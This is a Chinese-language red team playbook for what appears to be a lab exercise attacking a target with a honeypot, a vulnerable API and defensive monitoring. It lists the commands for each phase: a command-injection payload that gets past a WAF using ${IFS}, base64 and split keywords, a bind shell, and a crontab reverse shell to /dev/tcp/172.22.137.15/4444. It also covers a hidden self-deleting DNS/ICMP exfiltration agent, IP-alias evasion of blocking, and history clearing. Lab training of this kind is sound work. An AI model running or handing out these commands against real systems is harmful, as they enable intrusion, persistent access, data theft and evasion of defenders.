# Red Team Playbook - 企業黑箱網路攻防實戰

## 環境概覽

| 角色 | 位置 | 說明 |
|------|------|------|
| 紅軍攻擊機 | 同學筆電 (WSL2) | 攻擊發起端 |
| 企業靶機 | Lab 機器 `ad_target` 帳號 | 目標，低權限 |
| 藍軍防禦中心 | Lab 機器 `SuperUser` 帳號 | MDR + 蜜罐 + tshark |

## 目標基礎設施

| 服務 | Port | 說明 | 注意事項 |
|------|------|------|----------|
| Honeypot (假 SSH) | 2222 | 蜜罐陷阱 | **觸碰即觸發 MDR 封鎖 IP** |
| Vuln API (真目標) | 9999 | 含 WAF 的 Command Injection | 主要攻擊面 |
| Bind Shell | 4444 | 部署後的 C2 通道 | exploit 成功後連線 |

**Target IP:** `100.103.146.70` (依實際環境調整)

---

## 攻擊流程 (Kill Chain)

### Phase 1: Reconnaissance (偵察)

```bash
# 執行偵察腳本
chmod +x recon.sh
./recon.sh <TARGET_IP>

# 或手動執行
nmap -p 2000-10000 -sV <TARGET_IP>
```

**關鍵發現：**
- Port 2222 → SSH banner (蜜罐，不要碰！)
- Port 9999 → Diagnostic API (真正目標)

### Phase 2: Exploitation (攻擊)

```bash
# 執行攻擊腳本
python3 exploit.py <TARGET_IP>
```

**WAF 繞過原理：**

WAF 黑名單: `[' ', 'bash', 'nc', 'sh', '/dev/tcp']`

| 技術 | 說明 |
|------|------|
| `${IFS}` | 替代空格字元，繞過空格過濾 |
| `base64 -d` | 將整個 payload 編碼，繞過關鍵字偵測 |
| `b\a\s\h` | 反斜線拆分關鍵字，繞過字串匹配 |

**Payload 結構：**
```
127.0.0.1;echo${IFS}<base64_payload>|base64${IFS}-d|b\a\s\h
```

### Phase 3: Post-Exploitation (後滲透)

```bash
# 連線到 Bind Shell
nc -v <TARGET_IP> 4444

# 進入後執行情報蒐集
whoami
uname -a
id
```

### Phase 4: Persistence (持久化)

```bash
# 植入 crontab 反向 shell (替換 <WSL2_IP>)
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/<WSL2_IP>/4444 0>&1'") | crontab -
```

### Phase 5: Evasion — eBPF v1 Bypass (繞過防禦)

**場景**：藍軍已啟動 eBPF v1，memfd_create 攻擊被攔截。
**策略**：改用不經過 memfd_create 的 TCP 反向 Shell。

```bash
# 攻擊機: 啟動 reverse shell listener + payload 產生器
python3 red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>

# 另一終端: 貼上輸出的 curl 指令
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
```

**繞過原理：**

| eBPF v1 Hook | 我們是否觸發 | 為什麼 |
|--------------|-------------|--------|
| `memfd_create` | ❌ 不觸發 | 不用 memfd，直接 fork |
| `execve /proc/fd` | ❌ 不觸發 | 不從 /proc/fd 執行 |
| `socket(SOCK_RAW)` | ❌ 不觸發 | 用 SOCK_STREAM (TCP) |

**攻擊鏈：**
```
SSTI → os.popen → base64 -d → python3 → fork()
  └→ child: socket(SOCK_STREAM) → connect(ATTACKER_IP:4444)
       → dup2(sock, 0) → dup2(sock, 1) → dup2(sock, 2)
       → pty.spawn("/bin/bash") → interactive shell
```

**注意**：此攻擊不需要 sudo（用 TCP 不用 ICMP raw socket）

---

### Phase 5b: Exfiltration (資料外傳)

```bash
# 攻擊機: 啟動接收器
sudo python3 exfil_listener.py

# 靶機 (bind shell 內): 部署 agent
# 先在攻擊機生成部署指令:
./deploy_agent.sh <WSL2_IP>
# 然後將輸出貼到 bind shell 中執行
```

通道: DNS (主) / ICMP (備用)，自動偵測切換。
外傳完成後 agent 自動刪除。

### Phase 6: Cleanup (清除痕跡)

```bash
history -c
exit
```

---

## IP 切換原理 (繞過 MDR 封鎖)

藍軍 MDR 以 iptables DROP 封鎖觸碰蜜罐的 IP。紅隊透過 IP alias 掛載第二個 IP 繞過封鎖。

| IP | 用途 | 結果 |
|----|------|------|
| 172.22.137.14 (主) | 觸發蜜罐 port 2222 | 被 MDR 封鎖 |
| 172.22.137.15 (備用) | 攻擊 port 9999 + 外傳 | 未被封鎖 |

管理指令: `./ip_switch.sh add` / `remove` / `status`

---

## MITRE ATT&CK 對應

| 戰術 | 技術 ID | 說明 | 對應階段 |
|------|---------|------|----------|
| Reconnaissance | T1595 | Active Scanning | Phase 1: nmap |
| Resource Development | T1587.001 | Develop Capabilities: Malware | exploit.py 開發 |
| Initial Access | T1190 | Exploit Public-Facing Application | Phase 2: vuln_api |
| Execution | T1059.006 | Python Scripting | Bind Shell payload |
| Persistence | T1053.003 | Cron Job | Phase 4: crontab |
| Defense Evasion | T1027 | Obfuscated Files (Base64) | WAF 繞過 |
| Defense Evasion | T1140 | Deobfuscate/Decode | base64 -d 解碼執行 |
| Discovery | T1082 | System Information Discovery | whoami, uname |
| Command & Control | T1571 | Non-Standard Port (4444) | Bind Shell |
| Defense Evasion | T1036 | Masquerading (IP 切換) | IP alias 繞過 MDR |
| Collection | T1005 | Data from Local System | exfil_agent 蒐集 |
| Exfiltration | T1048.003 | Over Non-C2 Protocol (DNS/ICMP) | 隱蔽通道外傳 |

| Defense Evasion | T1070.004 | File Deletion | exfil_agent 自刪 |
| Defense Evasion | T1070.003 | Clear Command History | history -c |
| Command & Control | T1071.001 | Application Layer Protocol (TCP) | reverse shell bypass |
| Defense Evasion | — | eBPF v1 Bypass | 避開 memfd/ICMP hook |

**刻意排除：** Privilege Escalation、Impact (控制爆炸半徑)

---

## 工具清單

| 工具 | 用途 |
|------|------|
| Nmap | 埠掃描與服務探測 |
| Python 3 | exploit / exfil 腳本 |
| Netcat (nc) | Bind Shell 連線 |
| Base64 | Payload 編碼/解碼 |
| dig | DNS 隱蔽通道發送 |
| exfil_listener.py | 攻擊機端 DNS/ICMP 接收器 |
| exfil_agent.py | 靶機端自動蒐集 + 外傳 agent |
| deploy_agent.sh | 一鍵生成 agent 部署指令 |
| ip_switch.sh | IP alias 管理 (繞過 MDR) |
| red_reverse_shell.py | TCP 反向 Shell (繞過 eBPF v1) |

---

## 完整 Demo 流程 (快速指令速查)

以下是完整的 Demo 執行順序，整合 IP 切換 + 攻擊 + 外傳：

### 事前準備 (攻擊機 WSL2)

```bash
# 0. 掛載備用 IP
./ip_switch.sh add

# 1. 啟動 exfil 接收器 (背景執行)
sudo python3 exfil_listener.py &

# 2. 生成 agent 部署指令 (先備好，稍後貼入 shell)
./deploy_agent.sh 172.22.137.15
```

### Phase 1-2: 偵察 + 蜜罐觸發

```bash
# 3. 偵察目標
./recon.sh <TARGET_IP>

# 4. Demo 蜜罐觸發 (用主 IP 172.22.137.14，預期被 MDR 封鎖)
nc -v <TARGET_IP> 2222
# → 藍軍 MDR 自動封鎖主 IP
```

### Phase 3: 攻擊 (IP 切換後)

```bash
# 5. 用備用 IP 繞過封鎖，發動攻擊
python3 exploit.py <TARGET_IP> 9999 172.22.137.15

# 6. 連線 Bind Shell (指定備用 IP)
nc -s 172.22.137.15 -v <TARGET_IP> 4444
```

### Phase 4-6: 後滲透 (在 Bind Shell 內)

```bash
# 7. 情報蒐集
whoami && uname -a && id

# 8. 持久化
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/172.22.137.15/4444 0>&1'") | crontab -

# 9. 資料外傳 (貼入步驟 2 生成的部署指令)
echo '<base64>' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py 172.22.137.15
# → agent 自動蒐集 + 外傳 + 自刪
# → 攻擊機 listener 自動接收到 ./loot/

# 10. 清除痕跡 & 離開
history -c && exit
```

### 收尾 (攻擊機)

```bash
# 11. 檢查戰利品
ls -la ./loot/

# 12. 清理備用 IP
./ip_switch.sh remove
```

---

## 注意事項

1. **Port 2222 是蜜罐** - 觸碰會被 MDR 封鎖 IP，Demo 時用主 IP 觸發後切換備用 IP 繼續攻擊
2. **替換 IP** - 使用前將 `<TARGET_IP>` 和 `<WSL2_IP>` 替換為實際 IP
3. **純 CLI 操作** - 本演練禁止使用圖形化工具
4. **爆炸半徑控制** - 不進行提權和破壞性操作
